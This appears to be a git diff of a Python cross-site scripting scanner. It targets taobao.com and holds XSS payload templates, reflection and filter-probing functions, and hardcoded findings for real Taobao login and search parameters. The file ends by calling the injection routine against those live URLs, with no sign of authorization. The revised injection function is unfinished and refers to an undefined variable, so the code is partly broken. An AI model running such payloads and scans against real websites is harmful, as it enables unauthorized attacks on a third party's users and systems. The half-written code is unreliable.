@@ -16,13 +16,6 @@ import sys
 url = 'https://www.taobao.com/'
 allow_domain = 'taobao.com'
 
-keywords = (
-    'embed','src','svg','onload','style','marquee','onstart','object','data',
-    'onerror','iframe','video','audio','a','href','onmousemove','onmouseover',
-    'onclick','var','script','div','span','img','image','select','textarea',
-    'input','keygen','autofocus','onfocus','onstart','background','alert',
-    'prompt','confirm','javascript'
-)
 common_payload = (
     r'{(">|"/>|</[TAGNAME]>}<embed{/}[RND]src=[EVAL]>',
     r'{(">|"/>|</[TAGNAME]>}<svg{/}[RND]onload=[EVAL]>',
@@ -39,6 +32,8 @@ common_payload = (
     r'{">|"/>|</[TAGNAME]>}<(img|image){/}[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>',
     r'{">|"/>|</[TAGNAME]>}<(select|textarea|input|keygen){/}[RND]autofocus(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>'
 )
+
+
 event_payload = (
     r'{/}(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|data|)=[EVAL]{//}'
 )
@@ -52,29 +47,10 @@ js_payload = (
     r'{javascript:}confirm(0)',
 )
 
-def crawl_url_all_links(url):
-    '''
-    Crawl url's all links
-    '''
-    pass
-
-
-def payload_parse_synax(raw,info):
-    '''
-    Payload synax parse
-    '''
-    tagname = info['tagname']
-    isevent = info['isevent']
-    isclose = info['isclose']
-    SWITCH = r'\((.*?)\)'
-
-    OPTION = r'\{(.*?)\}'
-
 
 def get_dynamic_links_url(murl):
     '''
     Read dynamic links from url, only GET
-    Final version
     '''
     url_links = list()
     ignore = dict()
@@ -155,7 +131,6 @@ def get_dynamic_links_rest(murl):
 def get_dynamic_links_form(murl):
     '''
     Read dynmaic links from form, GET and POST
-    Final version
     '''
     form_links = list()
     response = requests.get(murl)
@@ -233,28 +208,32 @@ def get_output_position(links):
             regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(r)
             regex_attrs = r'\<.*\=\".*{0}.*\".*\>'.format(r)
             position = re.findall(regex_rnd,response.text)
-            if len(p) != 5:
-                n = p.replace('param','')
+            kk = list(item.keys())[list(item.values()).index(p)]
+            if len(kk) != 5:
+                n = kk.replace('param','')
                 name = 'pos' + str(n)
             else:
                 name = 'pos'
             item[name] = list()
             for pos in position:
                 if re.findall(regex_tags,pos):
-                    item[name].append('tags')
-                    print(p,'output between tags')
+                    if 'tags' not in item[name]:
+                        item[name].append('tags')
+                        print(p,'output between tags')
                 elif re.findall(regex_attrs,pos):
-                    item[name].append('attrs')
-                    print(p,'output in tags')
+                    if 'attrs' not in item[name]:
+                        item[name].append('attrs')
+                        print(p,'output in tags')
                 else:
-                    item[name].append('page')
-                    print(p,'output on the page')
+                    if 'page' not in item[name]:
+                        item[name].append('page')
+                        print(p,'output on the page')
         plinks.append(item)
     return plinks
 
 def get_xss_filter(links):
     '''
-    find filtered keyword
+    Find filtered keyword
     '''
     symbols = '<>`\\\'\"'
     xlinks = list()
@@ -294,12 +273,18 @@ def get_xss_filter(links):
                     for w in keyword:
                         if w == s:
                             allowed.append(s)
+            kk = list(item.keys())[list(item.values()).index(p)]
+            if len(kk) != 5:
+                n = kk.replace('param','')
+                name = 'filtered' + str(n)
+            else:
+                name = 'filtered'
             if len(allowed) == len(symbols):
-                item['filtered'] = 'null'
+                item[name] = 'null'
                 print(p,'allowed all symbols')
             else:
                 filtered = ','.join(a for a in symbols if a not in allowed)
-                item['filtered'] = filtered
+                item[name] = filtered
                 print(p,filtered,'filtered')
         xlinks.append(item)
     return xlinks
@@ -332,43 +317,516 @@ def encode_xss_payload(payload,entype):
         return asc_p
 
 
-def automatic_gen_payload(result):
-    '''
-    Generate payload according to the result
-    '''
-    pass
-
-
 def inject_xss_payload(links):
     '''
     Testing XSS vul
     '''
-    for murl,mitem in links.items():
-        for method,item in mitem.items():
-            for pos,params in item.items():
-                data = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
-                if method == 'get':
-                    response = requests.get(murl,params=data)
-                else:
-                    response = requests.post(murl,data=data)
-                for k,v in data.items():
-                    regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(v)
-                    tagname = re.findall(regex_tagname,response.text)
-                    for tag in tagname:
-                        fuzz = data.copy()
-                        payload = '</{0}><script>alert(/xss/)'.format(tag)
-                        fuzz[k] = payload
-                        if method == 'get':
-                            response = requests.get(murl, params=fuzz)
-                        else:
-                            response = requests.post(murl,data=fuzz)
-                        if response.text.find(payload) != -1:
-                            print(k,'detect xss:',payload)
+    for item in links:
+        url = item['url']
+        method = item['method']
+        keys = list(item.keys())
+        params = list()
+        pos = list()
+        filtered = list()
+        israw = False
+        if 'raw' in item:
+            raw = item['raw']
+            israw = True
+        for k in keys:
+            if k.startswith('param'):
+                params.append(item[k])
+            if k.startswith('pos'):
+                pos.append(item[k])
+            if k.startswith('filtered'):
+                filtered.append(item[k])
+        for p in params:
+            kk = list(item.keys())[list(item.values()).index(p)]
+            if len(kk) != 5:
+                n = kk.replace('param','')
+                ppos = item['pos' + str(n)]
+                pfiltered = item['filtered' + str(n)]
+            else:
+                ppos = item['pos']
+                pfiltered = item['filtered']
+            if not pfiltered:
+                print(p,'may be xss vul')
+            rnd = ''.join(random.sample(string.ascii_letters,8))
+            fuzz = dict()
+            fuzz[p] = rnd
+            if israw:
+                fuzz.update(raw)
+            if method == 'get':
+                response = requests.get(url,params=fuzz)
+            else:
+                response = requests.post(url,data=fuzz)
+            tagname = list()
+            regex_tagname = r'(?<=\<)(.*?)(?=\>.*?{0}.*?)'.format(rnd)
+            regex_attrname = r'(?<=\<)(.*?)(?=\s.*?{0})'.format(rnd)
+            if 'tags' in ppos:
+                tagname += re.findall(regex_tagname,response.text)
+            if 'attrs' in ppos:
+                keyword += re.findall(regex_attrname,response.text)
 
 
-ulinks = get_dynamic_links_url(url)
-#flinks = get_dynamic_links_form(url)
-plinks1 = get_output_position(ulinks)
-#plinks2 = get_output_position(flinks)
-xlinks1 = get_xss_filter(plinks1)
-#xlinks2 = get_xss_filter(plinks2)
+xlinks1 = [{
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'redirectURL': 'https%3A%2F%2Fwww.taobao.com%2F'
+    },
+    'pos': ['attrs'],
+    'param': 'f',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'f': 'top'
+    },
+    'pos': ['attrs'],
+    'param': 'redirectURL',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'ad_id': '',
+        'am_id': '',
+        'cm_id': '',
+        'from': 'mini'
+    },
+    'pos': ['attrs'],
+    'param': 'pm_id',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'ad_id': '',
+        'am_id': '',
+        'pm_id': '1501036000a02c5c3739',
+        'from': 'mini'
+    },
+    'pos': ['attrs'],
+    'param': 'cm_id',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'ad_id': '',
+        'cm_id': '',
+        'pm_id': '1501036000a02c5c3739',
+        'from': 'mini'
+    },
+    'pos': ['attrs'],
+    'param': 'am_id',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'am_id': '',
+        'cm_id': '',
+        'pm_id': '1501036000a02c5c3739',
+        'from': 'mini'
+    },
+    'pos': ['attrs'],
+    'param': 'ad_id',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://login.taobao.com/member/login.jhtml',
+    'raw': {
+        'ad_id': '',
+        'am_id': '',
+        'cm_id': '',
+        'pm_id': '1501036000a02c5c3739'
+    },
+    'pos': ['page', 'attrs'],
+    'param': 'from',
+    'method': 'get',
+    'filtered': '<,>,\',"'
+}, {
+    'url': 'https://fuwu.taobao.com/',
+    'raw': {},
+    'pos': ['attrs', 'page'],
+    'param': 'tracelog',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'style': 'grid',
+        'source': 'tbsy',
+        'q': '连衣裙',
+        'refpid': '420460_1006',
+        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66',
+        'spm': '1.7274553.1997520241-2.2.TpEKPQ'
+    },
+    'pos': ['page'],
+    'param': 'tab',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'source': 'tbsy',
+        'q': '连衣裙',
+        'tab': 'all',
+        'refpid': '420460_1006',
+        'spm': '1.7274553.1997520241-2.2.TpEKPQ',
+        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
+    },
+    'pos': ['page'],
+    'param': 'style',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'source': 'tbsy',
+        'q': '连衣裙',
+        'tab': 'all',
+        'refpid': '420460_1006',
+        'style': 'grid',
+        'spm': '1.7274553.1997520241-2.2.TpEKPQ'
+    },
+    'pos': ['page'],
+    'param': 'pvid',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'style': 'grid',
+        'q': '连衣裙',
+        'tab': 'all',
+        'refpid': '420460_1006',
+        'spm': '1.7274553.1997520241-2.2.TpEKPQ',
+        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
+    },
+    'pos': ['page'],
+    'param': 'source',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'source': 'tbsy',
+        'q': '连衣裙',
+        'tab': 'all',
+        'refpid': '420460_1006',
+        'style': 'grid',
+        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
+    },
+    'pos': ['page'],
+    'param': 'spm',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'style': 'grid',
+        'source': 'tbsy',
+        'q': '连衣裙',
+        'tab': 'all',
+        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66',
+        'spm': '1.7274553.1997520241-2.2.TpEKPQ'
+    },
+    'pos': ['page'],
+    'param': 'refpid',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'spm': '1.7274553.1997520241-2.2.TpEKPQ',
+        'source': 'tbsy',
+        'tab': 'all',
+        'refpid': '420460_1006',
+        'style': 'grid',
+        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
+    },
+    'pos': ['attrs', 'tags', 'page'],
+    'param': 'q',
+    'method': 'get',
+    'filtered': '<,>,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'q': '%E7%BE%8E%E9%A3%9F',
+        'initiative_id': 'staobaoz_20180724',
+        'ie': 'utf8',
+        'imgfile': '',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'js',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'q': '%E7%BE%8E%E9%A3%9F',
+        'ie': 'utf8',
+        'js': '1',
+        'imgfile': '',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'initiative_id',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'q': '%E7%BE%8E%E9%A3%9F',
+        'initiative_id': 'staobaoz_20180724',
+        'ie': 'utf8',
+        'js': '1',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'imgfile',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'q': '%E7%BE%8E%E9%A3%9F',
+        'initiative_id': 'staobaoz_20180724',
+        'js': '1',
+        'imgfile': '',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'ie',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'q': '%E7%BE%8E%E9%A3%9F',
+        'initiative_id': 'staobaoz_20180724',
+        'ie': 'utf8',
+        'js': '1',
+        'imgfile': ''
+    },
+    'pos': ['page'],
+    'param': 'stats_click',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'staobaoz_20180724',
+        'wq': '%E7%94%9F%E9%B2%9C',
+        'ie': 'utf8',
+        'js': '1',
+        'suggest_query': '%E7%94%9F%E9%B2%9C',
+        'imgfile': '',
+        'source': 'suggest',
+        'q': '%E7%94%9F%E9%B2%9C',
+        '_input_charset': 'utf-8',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'suggest',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'staobaoz_20180724',
+        'suggest': 'history_1',
+        'ie': 'utf8',
+        'js': '1',
+        'suggest_query': '%E7%94%9F%E9%B2%9C',
+        'imgfile': '',
+        'source': 'suggest',
+        'q': '%E7%94%9F%E9%B2%9C',
+        '_input_charset': 'utf-8',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'wq',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'staobaoz_20180724',
+        'wq': '%E7%94%9F%E9%B2%9C',
+        'ie': 'utf8',
+        'js': '1',
+        'imgfile': '',
+        'suggest': 'history_1',
+        'q': '%E7%94%9F%E9%B2%9C',
+        'source': 'suggest',
+        '_input_charset': 'utf-8',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': 'suggest_query',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'staobaoz_20180724',
+        'wq': '%E7%94%9F%E9%B2%9C',
+        'ie': 'utf8',
+        'js': '1',
+        'suggest_query': '%E7%94%9F%E9%B2%9C',
+        'imgfile': '',
+        'suggest': 'history_1',
+        'q': '%E7%94%9F%E9%B2%9C',
+        'source': 'suggest',
+        'stats_click': 'search_radio_all%3A1'
+    },
+    'pos': ['page'],
+    'param': '_input_charset',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'tbindexz_20170306',
+        'search_type': 'item',
+        'ssid': 's5-e',
+        'imgfile': '',
+        'q': '%E9%9B%B6%E9%A3%9F',
+        'spm': 'a21bo.2017.201856-taobao-item.1',
+        'ie': 'utf8',
+        'commend': 'all'
+    },
+    'pos': ['page'],
+    'param': 'sourceId',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'tbindexz_20170306',
+        'ie': 'utf8',
+        'ssid': 's5-e',
+        'imgfile': '',
+        'q': '%E9%9B%B6%E9%A3%9F',
+        'spm': 'a21bo.2017.201856-taobao-item.1',
+        'sourceId': 'tb.index',
+        'commend': 'all'
+    },
+    'pos': ['page'],
+    'param': 'search_type',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'tbindexz_20170306',
+        'search_type': 'item',
+        'ssid': 's5-e',
+        'imgfile': '',
+        'q': '%E9%9B%B6%E9%A3%9F',
+        'sourceId': 'tb.index',
+        'ie': 'utf8',
+        'spm': 'a21bo.2017.201856-taobao-item.1'
+    },
+    'pos': ['page'],
+    'param': 'commend',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/search',
+    'raw': {
+        'initiative_id': 'tbindexz_20170306',
+        'search_type': 'item',
+        'imgfile': '',
+        'q': '%E9%9B%B6%E9%A3%9F',
+        'spm': 'a21bo.2017.201856-taobao-item.1',
+        'sourceId': 'tb.index',
+        'ie': 'utf8',
+        'commend': 'all'
+    },
+    'pos': ['page'],
+    'param': 'ssid',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/list',
+    'raw': {
+        'spm': 'a21bo.50862.201867-links-10.27.iQWRJS',
+        'source': 'youjia'
+    },
+    'pos': ['page'],
+    'param': 'cat',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/list',
+    'raw': {
+        'bcoffset': '0',
+        'spm': 'a21bo.50862.201867-links-11.80.K6jN68',
+        'cat': '50008163',
+        'source': 'youjia'
+    },
+    'pos': ['page'],
+    'param': 's',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}, {
+    'url': 'https://s.taobao.com/list',
+    'raw': {
+        'spm': 'a21bo.50862.201867-links-11.80.K6jN68',
+        's': '240',
+        'cat': '50008163',
+        'source': 'youjia'
+    },
+    'pos': ['page'],
+    'param': 'bcoffset',
+    'method': 'get',
+    'filtered': '<,>,`,\\,\',"'
+}]
+
+xlinks2 = [{
+    'param6': 'ssid',
+    'url': 'https://s.taobao.com/search',
+    'pos9': ['page'],
+    'pos1': ['page'],
+    'filtered1': '<,>,`,\\,\',"',
+    'param2': 'commend',
+    'pos5': ['page'],
+    'param4': 'initiative_id',
+    'filtered5': '<,>,`,\\,\',"',
+    'pos2': ['page'],
+    'param9': 'sourceId',
+    'filtered3': '<,>,`,\\,\',"',
+    'filtered9': '<,>,`,\\,\',"',
+    'filtered4': '<,>,`,\\,\',"',
+    'pos3': ['page'],
+    'filtered7': '<,>,`,\\,\',"',
+    'filtered2': '<,>,`,\\,\',"',
+    'param8': 'q',
+    'filtered8': '<,>,\\,\',"',
+    'filtered6': '<,>,`,\\,\',"',
+    'param7': 'ie',
+    'param5': 'imgfile',
+    'pos7': ['page'],
+    'method': 'get',
+    'param3': 'search_type',
+    'pos8': ['attrs', 'tags', 'page'],
+    'pos6': ['page'],
+    'param1': 'spm',
+    'pos4': ['page']
+}]
+
+# ulinks = get_dynamic_links_url(url)
+# flinks = get_dynamic_links_form(url)
+
+# plinks1 = get_output_position(ulinks)
+# plinks2 = get_output_position(flinks)
+
+# xlinks1 = get_xss_filter(plinks1)
+# xlinks2 = get_xss_filter(plinks2)
+
+inject_xss_payload(xlinks1)
